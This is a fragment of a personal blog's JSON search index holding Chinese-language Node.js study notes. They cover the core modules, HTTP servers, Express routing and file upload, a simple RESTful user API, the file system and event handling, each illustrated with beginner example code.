状态为子组件提供一些插槽内容吧。","categories":[{"name":"前端学习","slug":"前端学习","permalink":"https://snowman12137.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"前端学习,VUE","slug":"前端学习-VUE","permalink":"https://snowman12137.github.io/tags/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0-VUE/"}],"author":"Sn0wma1n"},{"title":"Node.js学习（三）","slug":"Node-js学习（三）","date":"2024-02-01T16:00:00.000Z","updated":"2024-02-03T17:04:09.455Z","comments":true,"path":"2024/02/02/Node-js学习（三）/","link":"","permalink":"https://snowman12137.github.io/2024/02/02/Node-js%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/","excerpt":"","text":"Node.js学习（三）1.工具模块a.OS模块12345678910111213141516var os = require(&quot;os&quot;);//引入// CPU 的字节序console.log(&#x27;endianness : &#x27; + os.endianness());// 操作系统名console.log(&#x27;type : &#x27; + os.type());// 操作系统名console.log(&#x27;platform : &#x27; + os.platform());// 系统内存总量console.log(&#x27;total memory : &#x27; + os.totalmem() + &quot; bytes.&quot;);// 操作系统空闲内存量console.log(&#x27;free memory : &#x27; + os.freemem() + &quot; bytes.&quot;); b.Path模块123456789var path = require(&quot;path&quot;);// 格式化路径console.log(&#x27;normalization : &#x27; + path.normalize(&#x27;/test/test1//2slashes/1slash/tab/..&#x27;));// 连接路径console.log(&#x27;joint path : &#x27; + path.join(&#x27;/test&#x27;, &#x27;test1&#x27;, &#x27;2slashes/1slash&#x27;, &#x27;tab&#x27;, &#x27;..&#x27;));// 转换为绝对路径console.log(&#x27;resolve : &#x27; + path.resolve(&#x27;main.js&#x27;));// 路径中文件的后缀名console.log(&#x27;ext name : &#x27; + path.extname(&#x27;main.js&#x27;)); c.Net模块(Socket)server.js服务端 123456789101112var net = require(&#x27;net&#x27;);var server = net.createServer(function(connection) &#123; console.log(&#x27;client connected&#x27;); connection.on(&#x27;end&#x27;, function() &#123; console.log(&#x27;客户端关闭连接&#x27;); &#125;); connection.write(&#x27;Hello World!\\r\\n&#x27;); connection.pipe(connection);&#125;);server.listen(8080, function() &#123; console.log(&#x27;server is listening&#x27;);&#125;); client.js客户端 1234567891011var net = require(&#x27;net&#x27;);var client = net.connect(&#123;port: 8080&#125;, function() &#123; console.log(&#x27;连接到服务器！&#x27;); &#125;);client.on(&#x27;data&#x27;, function(data) &#123; console.log(data.toString()); client.end();&#125;);client.on(&#x27;end&#x27;, function() &#123; console.log(&#x27;断开与服务器的连接&#x27;);&#125;); d.DNS模块123456789101112var dns = require(&#x27;dns&#x27;);dns.lookup(&#x27;www.github.com&#x27;, function onLookup(err, address, family) &#123; console.log(&#x27;ip 地址:&#x27;, address); dns.reverse(address, function (err, hostnames) &#123; if (err) &#123; console.log(err.stack); &#125; console.log(&#x27;反向解析 &#x27; + address + &#x27;: &#x27; + JSON.stringify(hostnames));&#125;); &#125;); 执行结果 12address: 192.30.252.130reverse for 192.30.252.130: [&quot;github.com&quot;] 2.Web模块web应用架构 Client - 客户端，一般指浏览器，浏览器可以通过 HTTP 协议向服务器请求数据。 Server - 服务端，一般指 Web 服务器，可以接收客户端请求，并向客户端发送响应数据。 Business - 业务层， 通过 Web 服务器处理应用程序，如与数据库交互，逻辑运算，调用外部程序等。 Data - 数据层，一般由数据库组成。 a.创建Web服务器以下是演示一个最基本的 HTTP 服务器架构(使用 8080 端口)，创建 server.js 文件，代码如下所示： 1234567891011121314151617181920212223242526272829303132333435var http = require(&#x27;http&#x27;);var fs = require(&#x27;fs&#x27;);var url = require(&#x27;url&#x27;); // 创建服务器http.createServer( function (request, response) &#123; // 解析请求，包括文件名 var pathname = url.parse(request.url).pathname; // 输出请求的文件名 console.log(&quot;Request for &quot; + pathname + &quot; received.&quot;); // 从文件系统中读取请求的文件内容 fs.readFile(pathname.substr(1), function (err, data) &#123; if (err) &#123; console.log(err); // HTTP 状态码: 404 : NOT FOUND // Content Type: text/html response.writeHead(404, &#123;&#x27;Content-Type&#x27;: &#x27;text/html&#x27;&#125;); &#125;else&#123; // HTTP 状态码: 200 : OK // Content Type: text/html response.writeHead(200, &#123;&#x27;Content-Type&#x27;: &#x27;text/html&#x27;&#125;); // 响应文件内容 response.write(data.toString()); &#125; // 发送响应数据 response.end(); &#125;); &#125;).listen(8080); // 控制台会输出以下信息console.log(&#x27;Server running at http://127.0.0.1:8080/&#x27;); index.html 1234567891011&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;我的第一个标题&lt;/h1&gt; &lt;p&gt;我的第一个段落。&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; b创建Web客户端创建 12345678910111213141516171819202122232425var http = require(&#x27;http&#x27;); // 用于请求的选项var options = &#123; host: &#x27;localhost&#x27;, port: &#x27;8080&#x27;, path: &#x27;/index.html&#x27; &#125;; // 处理响应的回调函数var callback = function(response)&#123; // 不断更新数据 var body = &#x27;&#x27;; response.on(&#x27;data&#x27;, function(data) &#123; body += data; &#125;); response.on(&#x27;end&#x27;, function() &#123; // 数据接收完成 console.log(body); &#125;);&#125;// 向服务端发送请求var req = http.request(options, callback);req.end(); 3.Express框架Express 是一个简洁而灵活的 node.js Web应用框架, 提供了一系列强大特性帮助你创建各种 Web 应用，和丰富的 HTTP 工具。 使用 Express 可以快速地搭建一个完整功能的网站。 Express 框架核心特性： 可以设置中间件来响应 HTTP 请求。 定义了路由表用于执行不同的 HTTP 请求动作。 可以通过向模板传递参数来动态渲染 HTML 页面。 a.安装安装 Express 并将其保存到依赖列表中： 1cnpm install express --save 以上命令会将 Express 框架安装在当前目录的 node_modules 目录中， node_modules 目录下会自动创建 express 目录。以下几个重要的模块是需要与 express 框架一起安装的： body-parser - node.js 中间件，用于处理 JSON, Raw, Text 和 URL 编码的数据。 cookie-parser - 这就是一个解析Cookie的工具。通过req.cookies可以取到传过来的cookie，并把它们转成对象。 multer - node.js 中间件，用于处理 enctype&#x3D;”multipart&#x2F;form-data”（设置表单的MIME编码）的表单数据。 123cnpm install body-parser --savecnpm install cookie-parser --savecnpm install multer --save b.请求和响应Express 应用使用回调函数的参数： request 和 response 对象来处理请求和响应的数据。 request 和 response 对象的具体介绍： Request 对象 - request 对象表示 HTTP 请求，包含了请求查询字符串，参数，内容，HTTP 头部等属性。常见属性有： req.app：当callback为外部文件时，用req.app访问express的实例 req.baseUrl：获取路由当前安装的URL路径 req.body &#x2F; req.cookies：获得「请求主体」&#x2F; Cookies req.hostname &#x2F; req.ip：获取主机名和IP地址 req.originalUrl：获取原始请求URL req.params：获取路由的parameters req.path：获取请求路径 req.protocol：获取协议类型 req.query：获取URL的查询参数串 req.route：获取当前匹配的路由 req.subdomains：获取子域名 req.accepts()：检查可接受的请求的文档类型 req.get()：获取指定的HTTP请求头 Response 对象 - response 对象表示 HTTP 响应，即在接收到请求时向客户端发送的 HTTP 响应数据。常见属性有： res.app：同req.app一样 res.append()：追加指定HTTP头 res.set()在res.append()后将重置之前设置的头 res.cookie(name，value [，option])：设置Cookie res.clearCookie()：清除Cookie res.download()：传送指定路径的文件 res.get()：返回指定的HTTP头 res.json()：传送JSON响应 res.jsonp()：传送JSONP响应 res.location()：只设置响应的Location HTTP头，不设置状态码或者close response res.render(view,[locals],callback)：渲染一个view，同时向callback传递渲染后的字符串，如果在渲染过程中有错误发生next(err)将会被自动调用。callback将会被传入一个可能发生的错误以及渲染后的页面，这样就不会自动输出了。 res.send()：传送HTTP响应 res.sendFile(path [，options] [，fn])：传送指定路径的文件 -会自动根据文件extension设定Content-Type res.set()：设置HTTP头，传入object可以一次设置多个头 c.路由我们已经了解了 HTTP 请求的基本应用，而路由决定了由谁(指定脚本)去响应客户端请求。在HTTP请求中，我们可以通过路由提取出请求的URL以及GET&#x2F;POST参数。接下来我们扩展 Hello World，添加一些功能来处理更多类型的 HTTP 请求。创建 express_demo2.js 文件，代码如下所示： 1234567891011121314151617181920212223242526272829303132var express = require(&#x27;express&#x27;);var app = express();// 主页输出 &quot;Hello World&quot;app.get(&#x27;/&#x27;, function (req, res) &#123; console.log(&quot;主页 GET 请求&quot;); res.send(&#x27;Hello GET&#x27;);&#125;)// POST 请求app.post(&#x27;/&#x27;, function (req, res) &#123; console.log(&quot;主页 POST 请求&quot;); res.send(&#x27;Hello POST&#x27;);&#125;)// /del_user 页面响应app.get(&#x27;/del_user&#x27;, function (req, res) &#123; console.log(&quot;/del_user 响应 DELETE 请求&quot;); res.send(&#x27;删除页面&#x27;);&#125;)// /list_user 页面 GET 请求app.get(&#x27;/list_user&#x27;, function (req, res) &#123; console.log(&quot;/list_user GET 请求&quot;); res.send(&#x27;用户列表页面&#x27;);&#125;)// 对页面 abcd, abxcd, ab123cd, 等响应 GET 请求app.get(&#x27;/ab*cd&#x27;, function(req, res) &#123; console.log(&quot;/ab*cd GET 请求&quot;); res.send(&#x27;正则匹配&#x27;);&#125;)var server = app.listen(8081, function () &#123; var host = server.address().address var port = server.address().port console.log(&quot;应用实例，访问地址为 http://%s:%s&quot;, host, port)&#125;) d.静态文件Express 提供了内置的中间件 express.static 来设置静态文件如：图片， CSS, JavaScript 等。 你可以使用 express.static 中间件来设置静态文件路径。例如，如果你将图片， CSS, JavaScript 文件放在 public 目录下，你可以这么写： 1app.use(&#x27;/public&#x27;, express.static(&#x27;public&#x27;)); 我们可以到 public&#x2F;images 目录下放些图片,如下所示： 12345node_modulesserver.jspublic/public/imagespublic/images/logo.png 让我们再修改下 “Hello World” 应用添加处理静态文件的功能。 创建 express_demo3.js 文件，代码如下所示： 1234567891011var express = require(&#x27;express&#x27;);var app = express();app.use(&#x27;/public&#x27;, express.static(&#x27;public&#x27;));app.get(&#x27;/&#x27;, function (req, res) &#123; res.send(&#x27;Hello World&#x27;);&#125;)var server = app.listen(8081, function () &#123; var host = server.address().address var port = server.address().port console.log(&quot;应用实例，访问地址为 http://%s:%s&quot;, host, port)&#125;) e.GET方法以下实例演示了在表单中通过 GET 方法提交两个参数，我们可以使用 server.js 文件内的 process_get 路由器来处理输入： idnex.html 12345678910&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://127.0.0.1:8081/process_get&quot; method=&quot;GET&quot;&gt;First Name: &lt;input type=&quot;text&quot; name=&quot;first_name&quot;&gt; &lt;br&gt; Last Name: &lt;input type=&quot;text&quot; name=&quot;last_name&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; server.js 123456789101112131415161718192021var express = require(&#x27;express&#x27;);var app = express();app.use(&#x27;/public&#x27;, express.static(&#x27;public&#x27;));app.get(&#x27;/index.html&#x27;, function (req, res) &#123; res.sendFile( __dirname + &quot;/&quot; + &quot;index.html&quot; );&#125;)app.get(&#x27;/process_get&#x27;, function (req, res) &#123; // 输出 JSON 格式 var response = &#123; &quot;first_name&quot;:req.query.first_name, &quot;last_name&quot;:req.query.last_name &#125;; console.log(response); res.end(JSON.stringify(response));&#125;)var server = app.listen(8081, function () &#123; var host = server.address().address var port = server.address().port console.log(&quot;应用实例，访问地址为 http://%s:%s&quot;, host, port) &#125;) f.文件上传以下我们创建一个用于上传文件的表单，使用 POST 方法，表单 enctype 属性设置为 multipart&#x2F;form-data。 1234567891011121314&lt;html&gt;&lt;head&gt;&lt;title&gt;文件上传表单&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h3&gt;文件上传：&lt;/h3&gt;选择一个文件上传: &lt;br /&gt;&lt;form action=&quot;/file_upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;input type=&quot;file&quot; name=&quot;image&quot; size=&quot;50&quot; /&gt;&lt;br /&gt;&lt;input type=&quot;submit&quot; value=&quot;上传文件&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; server.js 1234567891011121314151617181920212223242526272829303132333435var express = require(&#x27;express&#x27;);var app = express();var fs = require(&quot;fs&quot;);var bodyParser = require(&#x27;body-parser&#x27;);var multer = require(&#x27;multer&#x27;);app.use(&#x27;/public&#x27;, express.static(&#x27;public&#x27;));app.use(bodyParser.urlencoded(&#123; extended: false &#125;));app.use(multer(&#123; dest: &#x27;/tmp/&#x27;&#125;).array(&#x27;image&#x27;));app.get(&#x27;/index.html&#x27;, function (req, res) &#123; res.sendFile( __dirname + &quot;/&quot; + &quot;index.html&quot; );&#125;)app.post(&#x27;/file_upload&#x27;, function (req, res) &#123; console.log(req.files[0]); // 上传的文件信息 var des_file = __dirname + &quot;/&quot; + req.files[0].originalname; fs.readFile( req.files[0].path, function (err, data) &#123; fs.writeFile(des_file, data, function (err) &#123; if( err )&#123; console.log( err ); &#125;else&#123; response = &#123; message:&#x27;File uploaded successfully&#x27;, filename:req.files[0].originalname &#125;; &#125; console.log( response ); res.end( JSON.stringify( response ) ); &#125;); &#125;);&#125;) var server = app.listen(8081, function () &#123; var host = server.address().address var port = server.address().port console.log(&quot;应用实例，访问地址为 http://%s:%s&quot;, host, port)&#125;) g.Cookie管理我们可以使用中间件向 Node.js 服务器发送 cookie 信息，以下代码输出了客户端发送的 cookie 信息： 12345678910// express_cookie.js 文件var express = require(&#x27;express&#x27;)var cookieParser = require(&#x27;cookie-parser&#x27;)var util = require(&#x27;util&#x27;);var app = express()app.use(cookieParser())app.get(&#x27;/&#x27;, function(req, res) &#123; console.log(&quot;Cookies: &quot; + util.inspect(req.cookies));&#125;)app.listen(8081) 4.RESTful APIREST即表述性状态传递（英文：Representational State Transfer，简称REST）是Roy Fielding博士在2000年他的博士论文中提出来的一种软件架构风格。 表述性状态转移是一组架构约束条件和原则。满足这些约束条件和原则的应用程序或设计就是RESTful。需要注意的是，REST是设计风格而不是标准。REST通常基于使用HTTP，URI，和XML（标准通用标记语言下的一个子集）以及HTML（标准通用标记语言下的一个应用）这些现有的广泛流行的协议和标准。REST 通常使用 JSON 数据格式。 a.RESTful Web ServicesWeb service是一个平台独立的，低耦合的，自包含的、基于可编程的web的应用程序，可使用开放的XML（标准通用标记语言下的一个子集）标准来描述、发布、发现、协调和配置这些应用程序，用于开发分布式的互操作的应用程序。 基于 REST 架构的 Web Services 即是 RESTful。 由于轻量级以及通过 HTTP 直接传输数据的特性，Web 服务的 RESTful 方法已经成为最常见的替代方法。可以使用各种语言（比如 Java 程序、Perl、Ruby、Python、PHP 和 Javascript[包括 Ajax]）实现客户端。 RESTful Web 服务通常可以通过自动客户端或代表用户的应用程序访问。但是，这种服务的简便性让用户能够与之直接交互，使用它们的 Web 浏览器构建一个 GET URL 并读取返回的内容。 b.创建 RESTfuluser.json 1234567891011121314151617181920&#123; &quot;user1&quot; : &#123; &quot;name&quot; : &quot;mahesh&quot;, &quot;password&quot; : &quot;password1&quot;, &quot;profession&quot; : &quot;teacher&quot;, &quot;id&quot;: 1 &#125;, &quot;user2&quot; : &#123; &quot;name&quot; : &quot;suresh&quot;, &quot;password&quot; : &quot;password2&quot;, &quot;profession&quot; : &quot;librarian&quot;, &quot;id&quot;: 2 &#125;, &quot;user3&quot; : &#123; &quot;name&quot; : &quot;ramesh&quot;, &quot;password&quot; : &quot;password3&quot;, &quot;profession&quot; : &quot;clerk&quot;, &quot;id&quot;: 3 &#125;&#125; 基于以上数据，我们创建以下 RESTful API： 序号 URI HTTP 方法 发送内容 结果 1 listUsers GET 空 显示所有用户列表 2 addUser POST JSON 字符串 添加新用户 3 deleteUser DELETE JSON 字符串 删除用户 4 :id GET 空 显示用户详细信息 c.获取用户列表：以下代码，我们创建了 RESTful API listUsers，用于读取用户的信息列表， server.js 文件代码如下所示： 123456789101112131415var express = require(&#x27;express&#x27;);var app = express();var fs = require(&quot;fs&quot;);app.get(&#x27;/listUsers&#x27;, function (req, res) &#123; fs.readFile( __dirname + &quot;/&quot; + &quot;users.json&quot;, &#x27;utf8&#x27;, function (err, data) &#123; console.log( data ); res.end( data ); &#125;);&#125;)var server = app.listen(8081, function () &#123; var host = server.address().address var port = server.address().port console.log(&quot;应用实例，访问地址为 http://%s:%s&quot;, host, port)&#125;) d添加用户以下代码，我们创建了 RESTful API addUser， 用于添加新的用户数据，server.js 文件代码如下所示： 1234567891011121314151617181920212223242526var express = require(&#x27;express&#x27;);var app = express();var fs = require(&quot;fs&quot;);//添加的新用户数据var user = &#123; &quot;user4&quot; : &#123; &quot;name&quot; : &quot;mohit&quot;, &quot;password&quot; : &quot;password4&quot;, &quot;profession&quot; : &quot;teacher&quot;, &quot;id&quot;: 4 &#125;&#125;app.get(&#x27;/addUser&#x27;, function (req, res) &#123; // 读取已存在的数据 fs.readFile( __dirname + &quot;/&quot; + &quot;users.json&quot;, &#x27;utf8&#x27;, function (err, data) &#123; data = JSON.parse( data ); data[&quot;user4&quot;] = user[&quot;user4&quot;]; console.log( data ); res.end( JSON.stringify(data)); &#125;);&#125;)var server = app.listen(8081, function () &#123; var host = server.address().address var port = server.address().port console.log(&quot;应用实例，访问地址为 http://%s:%s&quot;, host, port)&#125;) 显示用户详情以下代码，我们创建了 RESTful API :id（用户id）， 用于读取指定用户的详细信息，server.js 文件代码如下所示： 1234567891011121314151617var express = require(&#x27;express&#x27;);var app = express();var fs = require(&quot;fs&quot;);app.get(&#x27;/:id&#x27;, function (req, res) &#123; // 首先我们读取已存在的用户 fs.readFile( __dirname + &quot;/&quot; + &quot;users.json&quot;, &#x27;utf8&#x27;, function (err, data) &#123; data = JSON.parse( data ); var user = data[&quot;user&quot; + req.params.id] console.log( user ); res.end( JSON.stringify(user)); &#125;);&#125;)var server = app.listen(8081, function () &#123; var host = server.address().address var port = server.address().port console.log(&quot;应用实例，访问地址为 http://%s:%s&quot;, host, port)&#125;) 删除用户以下代码，我们创建了 RESTful API deleteUser， 用于删除指定用户的详细信息，以下实例中，用户 id 为 2，server.js 文件代码如下所示： 123456789101112131415161718var express = require(&#x27;express&#x27;);var app = express();var fs = require(&quot;fs&quot;);var id = 2;app.get(&#x27;/deleteUser&#x27;, function (req, res) &#123; // First read existing users. fs.readFile( __dirname + &quot;/&quot; + &quot;users.json&quot;, &#x27;utf8&#x27;, function (err, data) &#123; data = JSON.parse( data ); delete data[&quot;user&quot; + id]; console.log( data ); res.end( JSON.stringify(data)); &#125;);&#125;)var server = app.listen(8081, function () &#123; var host = server.address().address var port = server.address().port console.log(&quot;应用实例，访问地址为 http://%s:%s&quot;, host, port)&#125;) 5.Node.js 多进程我们都知道 Node.js 是以单线程的模式运行的，但它使用的是事件驱动来处理并发，这样有助于我们在多核 cpu 的系统上创建多个子进程，从而提高性能。 每个子进程总是带有三个流对象：child.stdin, child.stdout 和child.stderr。他们可能会共享父进程的 stdio 流，或者也可以是独立的被导流的流对象。 Node 提供了 child_process 模块来创建子进程，方法有： exec - child_process.exec 使用子进程执行命令，缓存子进程的输出，并将子进程的输出以回调函数参数的形式返回。 spawn - child_process.spawn 使用指定的命令行参数创建新进程。 fork - child_process.fork 是 spawn()的特殊形式，用于在子进程中运行的模块，如 fork(‘.&#x2F;son.js’) 相当于 spawn(‘node’, [‘.&#x2F;son.js’]) 。与spawn方法不同的是，fork会在父进程与子进程之间，建立一个通信管道，用于进程之间的通信。 略（用上再看）","categories":[{"name":"Electron-Vue-WebRTC客户端学习","slug":"Electron-Vue-WebRTC客户端学习","permalink":"https://snowman12137.github.io/categories/Electron-Vue-WebRTC%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Nodejs学习","slug":"Nodejs学习","permalink":"https://snowman12137.github.io/tags/Nodejs%E5%AD%A6%E4%B9%A0/"}],"author":"Sn0wma1n"},{"title":"Node.js学习（二）","slug":"Node-js学习（二）","date":"2024-01-31T16:00:00.000Z","updated":"2024-02-03T17:04:20.106Z","comments":true,"path":"2024/02/01/Node-js学习（二）/","link":"","permalink":"https://snowman12137.github.io/2024/02/01/Node-js%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/","excerpt":"","text":"Node.js学习（二）1.文件系统Node.js 提供一组类似 UNIX（POSIX）标准的文件操作API。 Node 导入文件系统模块(fs)语法如下所示： 1var fs = require(&quot;fs&quot;) a.异步和同步Node.js 文件系统（fs 模块）模块中的方法均有异步和同步版本，例如读取文件内容的函数有异步的 fs.readFile() 和同步的 fs.readFileSync()。 异步的方法函数最后一个参数为回调函数，回调函数的第一个参数包含了错误信息(error)。 建议大家使用异步方法，比起同步，异步方法性能更高，速度更快，而且没有阻塞。 input.txt文件内容如下: 12菜鸟教程官网地址：www.runoob.com文件读取实例 file.js 123456789101112var fs = require(&quot;fs&quot;);// 异步读取fs.readFile(&#x27;input.txt&#x27;, function (err, data) &#123; if (err) &#123; return console.error(err); &#125; console.log(&quot;异步读取: &quot; + data.toString());&#125;);// 同步读取var data = fs.readFileSync(&#x27;input.txt&#x27;);console.log(&quot;同步读取: &quot; + data.toString());console.log(&quot;程序执行完毕。&quot;); 1234567$ node file.js 同步读取: 菜鸟教程官网地址：www.runoob.com文件读取实例程序执行完毕。异步读取: 菜鸟教程官网地址：www.runoob.com文件读取实例 b.打开文件以下为在异步模式下打开文件的语法格式： 1fs.open(path, flags[, mode], callback) 参数使用说明如下： path - 文件的路径。 flags - 文件打开的行为。具体值详见下文。 mode - 设置文件模式(权限)，文件创建默认权限为 0666(可读，可写)。 callback - 回调函数，带有两个参数如：callback(err, fd)。 12345678910var fs = require(&quot;fs&quot;);// 异步打开文件console.log(&quot;准备打开文件！&quot;);fs.open(&#x27;input.txt&#x27;, &#x27;r+&#x27;, function(err, fd) &#123; if (err) &#123; return console.error(err); &#125; console.log(&quot;文件打开成功！&quot;); &#125;); 2.GET&#x2F;POST请求a.获取GET请求内容由于GET请求直接被嵌入在路径中，URL是完整的请求路径，包括了?后面的部分，因此你可以手动解析后面的内容作为GET请求的参数。 node.js 中 url 模块中的 parse 函数提供了这个功能。 12345678var http = require(&#x27;http&#x27;);var url = require(&#x27;url&#x27;);var util = require(&#x27;util&#x27;); http.createServer(function(req, res)&#123; res.writeHead(200, &#123;&#x27;Content-Type&#x27;: &#x27;text/plain; charset=utf-8&#x27;&#125;); res.end(util.inspect(url.parse(req.url, true)));&#125;).listen(3000); 浏览器中访问http://localhost:3000/user?name=Sn0wm1an&amp;url=xiaowublog.top b.获取URL参数我们可以使用 url.parse 方法来解析 URL 中的参数，代码如下： 1234567891011121314var http = require(&#x27;http&#x27;);var url = require(&#x27;url&#x27;);var util = require(&#x27;util&#x27;); http.createServer(function(req, res)&#123; res.setHeader(&#x27;Content-Type&#x27;,&#x27;text/html; charset=utf-8&#x27;); // 解析 url 参数 var params = url.parse(req.url, true).query; res.write(&quot;网站名：&quot; + params.name); res.write(&quot;\\n&quot;); res.write(&quot;网站 URL：&quot; + params.url); res.end(); &#125;).listen(3000); c.获取 POST 请求内容POST 请求的内容全部的都在请求体中，http.ServerRequest 并没有一个属性内容为请求体，原因是等待请求体传输可能是一件耗时的工作。 比如上传文件，而很多时候我们可能并不需要理会请求体的内容，恶意的POST请求会大大消耗服务器的资源，所以 node.js 默认是不会解析请求体的，当你需要的时候，需要手动来做。 12345678910111213141516var http = require(&#x27;http&#x27;);var querystring = require(&#x27;querystring&#x27;);var util = require(&#x27;util&#x27;);http.createServer(function(req, res)&#123; // 定义了一个post变量，用于暂存请求体的信息 var post = &#x27;&#x27;; // 通过req的data事件监听函数，每当接受到请求体的数据，就累加到post变量中 req.on(&#x27;data&#x27;, function(chunk)&#123; post += chunk; &#125;); // 在end事件触发后，通过querystring.parse将post解析为真正的POST请求格式，然后向客户端返回。 req.on(&#x27;end&#x27;, function()&#123; post = querystring.parse(post); res.end(util.inspect(post)); &#125;);&#125;).listen(3000); 以下实例表单通过 POST 提交并输出数据： 12345678910111213141516171819202122232425262728293031323334var http = require(&#x27;http&#x27;);var querystring = require(&#x27;querystring&#x27;); var postHTML = &#x27;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;菜鸟教程 Node.js 实例&lt;/title&gt;&lt;/head&gt;&#x27; + &#x27;&lt;body&gt;&#x27; + &#x27;&lt;form method=&quot;post&quot;&gt;&#x27; + &#x27;网站名： &lt;input name=&quot;name&quot;&gt;&lt;br&gt;&#x27; + &#x27;网站 URL： &lt;input name=&quot;url&quot;&gt;&lt;br&gt;&#x27; + &#x27;&lt;input type=&quot;submit&quot;&gt;&#x27; + &#x27;&lt;/form&gt;&#x27; + &#x27;&lt;/body&gt;&lt;/html&gt;&#x27;; http.createServer(function (req, res) &#123; var body = &quot;&quot;; req.on(&#x27;data&#x27;, function (chunk) &#123; body += chunk; &#125;); req.on(&#x27;end&#x27;, function () &#123; // 解析参数 body = querystring.parse(body); // 设置响应头部信息及编码 res.writeHead(200, &#123;&#x27;Content-Type&#x27;: &#x27;text/html; charset=utf8&#x27;&#125;); if(body.name &amp;&amp; body.url) &#123; // 输出提交的数据 res.write(&quot;网站名：&quot; + body.name); res.write(&quot;&lt;br&gt;&quot;); res.write(&quot;网站 URL：&quot; + body.url); &#125; else &#123; // 输出表单 res.write(postHTML); &#125; res.end(); &#125;);&#125;).listen(3000);","categories":[{"name":"Electron-Vue-WebRTC客户端学习","slug":"Electron-Vue-WebRTC客户端学习","permalink":"https://snowman12137.github.io/categories/Electron-Vue-WebRTC%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Nodejs学习","slug":"Nodejs学习","permalink":"https://snowman12137.github.io/tags/Nodejs%E5%AD%A6%E4%B9%A0/"}],"author":"Sn0wma1n"},{"title":"Node.js学习（一）","slug":"Node-js学习（一）","date":"2024-01-29T16:00:00.000Z","updated":"2024-02-03T17:04:03.796Z","comments":true,"path":"2024/01/30/Node-js学习（一）/","link":"","permalink":"https://snowman12137.github.io/2024/01/30/Node-js%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"","text":"Node.js学习（一）1.Node.js的异步在了解Node.js异步之前，我们先看一看其前身JavaScript的异步编程技巧。 一个异步过程的执行将不再与原有的序列有顺序关系。简单来理解就是：同步按你的代码顺序执行，异步不按照代码顺序执行，异步的执行效率更高。 什么时候用异步编程 在前端编程中（甚至后端有时也是这样），我们在处理一些简短、快速的操作时，例如计算 1 + 1 的结果，往往在主线程中就可以完成。主线程作为一个线程，不能够同时接受多方面的请求。所以，当一个事件没有结束时，界面将无法处理其他请求。 现在有一个按钮，如果我们设置它的 onclick 事件为一个死循环，那么当这个按钮按下，整个网页将失去响应。 为了避免这种情况的发生，我们常常用子线程来完成一些可能消耗时间足够长以至于被用户察觉的事情，比如读取一个大文件或者发出一个网络请求。因为子线程独立于主线程，所以即使出现阻塞也不会影响主线程的运行。但是子线程有一个局限：一旦发射了以后就会与主线程失去同步，我们无法确定它的结束，如果结束之后需要处理一些事情，比如处理来自服务器的信息，我们是无法将它合并到主线程中去的。 为了解决这个问题，JavaScript 中的异步操作函数往往通过回调函数来实现异步任务的结果处理。 a.JavaSript回调函数回调函数就是一个函数，它是在我们启动一个异步任务的时候就告诉它：等你完成了这个任务之后要干什么。这样一来主线程几乎不用关心异步任务的状态了，他自己会善始善终。 1234function print() &#123; document.getElementById(&quot;demo&quot;).innerHTML=&quot;RUNOOB!&quot;;&#125;setTimeout(print, 3000); 这段程序中的 setTimeout 就是一个消耗时间较长（3 秒）的过程，它的第一个参数是个回调函数，第二个参数是毫秒数，这个函数执行之后会产生一个子线程，子线程会等待 3 秒，然后执行回调函数 “print”，在命令行输出 “RUNOOB!”。 而且我们可以不声明函数，用匿名函数放到方法里。 123setTimeout(function () &#123; document.getElementById(&quot;demo&quot;).innerHTML=&quot;RUNOOB!&quot;;&#125;, 3000); b.Nodejs回调函数创建阻塞代码main.js 123456var fs = require(&quot;fs&quot;);var data = fs.readFileSync(&#x27;input.txt&#x27;);console.log(data.toString());console.log(&quot;程序执行结束!&quot;); 非阻塞式代码是将方法中最后一位插入回调函数，形式如下 12345678var fs = require(&quot;fs&quot;);fs.readFile(&#x27;input.txt&#x27;, function (err, data) &#123; if (err) return console.error(err); console.log(data.toString());&#125;);console.log(&quot;程序执行结束!&quot;); 2.事件循环a.事件驱动程序，NodeJS使用的是事件驱动模型，当web server接收到请求，就把它关闭然后进行处理，然后去服务下一个web请求。 当这个请求完成，它被放回处理队列，当到达队列开头，这个结果被返回给用户。 这个模型非常高效可扩展性非常强，因为 webserver 一直接受请求而不等待任何读写操作。（这也称之为非阻塞式IO或者事件驱动IO） (图来源菜鸟) 整个事件驱动的流程就是这么实现的，非常简洁。有点类似于观察者模式，事件相当于一个主题(Subject)，而所有注册到这个事件上的处理函数相当于观察者(Observer)。 123456789// 引入 events 模块var events = require(&#x27;events&#x27;);// 创建 eventEmitter 对象var eventEmitter = new events.EventEmitter();// 绑定事件及事件的处理程序//eventHandler是绑定的函数eventEmitter.on(&#x27;eventName&#x27;, eventHandler);// 触发事件eventEmitter.emit(&#x27;eventName&#x27;); 例子 12345678910111213141516171819202122232425// 引入 events 模块var events = require(&#x27;events&#x27;);// 创建 eventEmitter 对象var eventEmitter = new events.EventEmitter(); // 创建事件处理程序var connectHandler = function connected() &#123; console.log(&#x27;连接成功。&#x27;); // 触发 data_received 事件 eventEmitter.emit(&#x27;data_received&#x27;);&#125; // 绑定 connection 事件处理程序eventEmitter.on(&#x27;connection&#x27;, connectHandler); // 使用匿名函数绑定 data_received 事件eventEmitter.on(&#x27;data_received&#x27;, function()&#123; console.log(&#x27;数据接收成功。&#x27;);&#125;); // 触发 